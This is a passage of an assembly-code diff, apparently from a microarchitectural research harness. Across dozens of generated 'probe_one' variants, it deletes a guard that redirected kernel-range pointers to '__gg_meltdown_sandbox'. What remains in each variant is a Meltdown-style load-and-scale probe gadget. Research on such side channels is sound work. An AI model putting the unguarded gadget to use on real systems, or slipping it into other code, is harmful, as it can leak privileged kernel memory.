-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1739,9 +1460,6 @@ probe_one:
 .Lprobe_one_win0_var94:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1751,9 +1469,6 @@ probe_one:
 .Lprobe_one_win0_var95:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1763,9 +1478,6 @@ probe_one:
 .Lprobe_one_win0_var96:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1775,9 +1487,6 @@ probe_one:
 .Lprobe_one_win0_var97:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1787,9 +1496,6 @@ probe_one:
 .Lprobe_one_win0_var98:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1799,9 +1505,6 @@ probe_one:
 .Lprobe_one_win0_var99:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1811,9 +1514,6 @@ probe_one:
 .Lprobe_one_win0_var100:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1823,9 +1523,6 @@ probe_one:
 .Lprobe_one_win0_var101:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1835,9 +1532,6 @@ probe_one:
 .Lprobe_one_win0_var102:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1847,9 +1541,6 @@ probe_one:
 .Lprobe_one_win0_var103:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1859,9 +1550,6 @@ probe_one:
 .Lprobe_one_win0_var104:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1871,9 +1559,6 @@ probe_one:
 .Lprobe_one_win0_var105:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1883,9 +1568,6 @@ probe_one:
 .Lprobe_one_win0_var106:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1895,9 +1577,6 @@ probe_one:
 .Lprobe_one_win0_var107:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1907,9 +1586,6 @@ probe_one:
 .Lprobe_one_win0_var108:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1919,9 +1595,6 @@ probe_one:
 .Lprobe_one_win0_var109:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1931,9 +1604,6 @@ probe_one:
 .Lprobe_one_win0_var110:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1943,9 +1613,6 @@ probe_one:
 .Lprobe_one_win0_var111:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1955,9 +1622,6 @@ probe_one:
 .Lprobe_one_win0_var112:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1967,9 +1631,6 @@ probe_one:
 .Lprobe_one_win0_var113:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1979,9 +1640,6 @@ probe_one:
 .Lprobe_one_win0_var114:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -1991,9 +1649,6 @@ probe_one:
 .Lprobe_one_win0_var115:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2003,9 +1658,6 @@ probe_one:
 .Lprobe_one_win0_var116:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2015,9 +1667,6 @@ probe_one:
 .Lprobe_one_win0_var117:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2027,9 +1676,6 @@ probe_one:
 .Lprobe_one_win0_var118:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2039,9 +1685,6 @@ probe_one:
 .Lprobe_one_win0_var119:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2051,9 +1694,6 @@ probe_one:
 .Lprobe_one_win0_var120:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2063,9 +1703,6 @@ probe_one:
 .Lprobe_one_win0_var121:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2075,9 +1712,6 @@ probe_one:
 .Lprobe_one_win0_var122:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2087,9 +1721,6 @@ probe_one:
 .Lprobe_one_win0_var123:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2099,9 +1730,6 @@ probe_one:
 .Lprobe_one_win0_var124:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2111,9 +1739,6 @@ probe_one:
 .Lprobe_one_win0_var125:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2123,9 +1748,6 @@ probe_one:
 .Lprobe_one_win0_var126:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2135,9 +1757,6 @@ probe_one:
 .Lprobe_one_win0_var127:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2147,9 +1766,6 @@ probe_one:
 .Lprobe_one_win0_var128:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2159,9 +1775,6 @@ probe_one:
 .Lprobe_one_win0_var129:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2171,9 +1784,6 @@ probe_one:
 .Lprobe_one_win0_var130:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2183,9 +1793,6 @@ probe_one:
 .Lprobe_one_win0_var131:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2195,9 +1802,6 @@ probe_one:
 .Lprobe_one_win0_var132:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2207,9 +1811,6 @@ probe_one:
 .Lprobe_one_win0_var133:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2219,9 +1820,6 @@ probe_one:
 .Lprobe_one_win0_var134:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2231,9 +1829,6 @@ probe_one:
 .Lprobe_one_win0_var135:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2243,9 +1838,6 @@ probe_one:
 .Lprobe_one_win0_var136:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2255,9 +1847,6 @@ probe_one:
 .Lprobe_one_win0_var137:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2267,9 +1856,6 @@ probe_one:
 .Lprobe_one_win0_var138:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2279,9 +1865,6 @@ probe_one:
 .Lprobe_one_win0_var139:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2291,9 +1874,6 @@ probe_one:
 .Lprobe_one_win0_var140:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2303,9 +1883,6 @@ probe_one:
 .Lprobe_one_win0_var141:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2315,9 +1892,6 @@ probe_one:
 .Lprobe_one_win0_var142:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2327,9 +1901,6 @@ probe_one:
 .Lprobe_one_win0_var143:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2339,9 +1910,6 @@ probe_one:
 .Lprobe_one_win0_var144:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2351,9 +1919,6 @@ probe_one:
 .Lprobe_one_win0_var145:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2363,9 +1928,6 @@ probe_one:
 .Lprobe_one_win0_var146:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2375,9 +1937,6 @@ probe_one:
 .Lprobe_one_win0_var147:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2387,9 +1946,6 @@ probe_one:
 .Lprobe_one_win0_var148:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2399,9 +1955,6 @@ probe_one:
 .Lprobe_one_win0_var149:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2411,9 +1964,6 @@ probe_one:
 .Lprobe_one_win0_var150:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2423,9 +1973,6 @@ probe_one:
 .Lprobe_one_win0_var151:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2435,9 +1982,6 @@ probe_one:
 .Lprobe_one_win0_var152:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2447,9 +1991,6 @@ probe_one:
 .Lprobe_one_win0_var153:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2459,9 +2000,6 @@ probe_one:
 .Lprobe_one_win0_var154:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2471,9 +2009,6 @@ probe_one:
 .Lprobe_one_win0_var155:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2483,9 +2018,6 @@ probe_one:
 .Lprobe_one_win0_var156:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2495,9 +2027,6 @@ probe_one:
 .Lprobe_one_win0_var157:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2507,9 +2036,6 @@ probe_one:
 .Lprobe_one_win0_var158:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2519,9 +2045,6 @@ probe_one:
 .Lprobe_one_win0_var159:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2531,9 +2054,6 @@ probe_one:
 .Lprobe_one_win0_var160:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2543,9 +2063,6 @@ probe_one:
 .Lprobe_one_win0_var161:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2555,9 +2072,6 @@ probe_one:
 .Lprobe_one_win0_var162:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2567,9 +2081,6 @@ probe_one:
 .Lprobe_one_win0_var163:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2579,9 +2090,6 @@ probe_one:
 .Lprobe_one_win0_var164:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2591,9 +2099,6 @@ probe_one:
 .Lprobe_one_win0_var165:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2603,9 +2108,6 @@ probe_one:
 .Lprobe_one_win0_var166:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2615,9 +2117,6 @@ probe_one:
 .Lprobe_one_win0_var167:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2627,9 +2126,6 @@ probe_one:
 .Lprobe_one_win0_var168:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2639,9 +2135,6 @@ probe_one:
 .Lprobe_one_win0_var169:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2651,9 +2144,6 @@ probe_one:
 .Lprobe_one_win0_var170:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2663,9 +2153,6 @@ probe_one:
 .Lprobe_one_win0_var171:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2675,9 +2162,6 @@ probe_one:
 .Lprobe_one_win0_var172:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2687,9 +2171,6 @@ probe_one:
 .Lprobe_one_win0_var173:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2699,9 +2180,6 @@ probe_one:
 .Lprobe_one_win0_var174:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2711,9 +2189,6 @@ probe_one:
 .Lprobe_one_win0_var175:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2723,9 +2198,6 @@ probe_one:
 .Lprobe_one_win0_var176:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2735,9 +2207,6 @@ probe_one:
 .Lprobe_one_win0_var177:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2747,9 +2216,6 @@ probe_one:
 .Lprobe_one_win0_var178:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2759,9 +2225,6 @@ probe_one:
 .Lprobe_one_win0_var179:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2771,9 +2234,6 @@ probe_one:
 .Lprobe_one_win0_var180:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2783,9 +2243,6 @@ probe_one:
 .Lprobe_one_win0_var181:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2795,9 +2252,6 @@ probe_one:
 .Lprobe_one_win0_var182:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2807,9 +2261,6 @@ probe_one:
 .Lprobe_one_win0_var183:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2819,9 +2270,6 @@ probe_one:
 .Lprobe_one_win0_var184:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2831,9 +2279,6 @@ probe_one:
 .Lprobe_one_win0_var185:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2843,9 +2288,6 @@ probe_one:
 .Lprobe_one_win0_var186:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
-	cmovs	%r10, %rdx
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
@@ -2855,9 +2297,6 @@ probe_one:
 .Lprobe_one_win0_var187:
 	popq	%rax
 	addq	$32, %rsp
-	leaq	__gg_meltdown_sandbox(%rip), %r10
-	testq	%rdx, %rdx
